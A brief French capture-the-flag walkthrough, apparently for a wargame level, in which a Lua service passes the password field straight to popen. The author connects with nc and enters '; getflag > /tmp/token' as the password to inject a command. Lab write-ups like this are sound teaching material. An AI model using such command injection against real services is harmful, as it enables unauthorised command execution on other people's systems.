J'affiche level11.lua et je vois directement que le programme fait un popen sans verifier le parametre du password demandé lors de la connexion

Je fais un

```bash
nc 127.0.0.1 5151
```

Ensuite je fais
```bash
Password:; getflag > /tmp/token
```
cat /tmp/token 
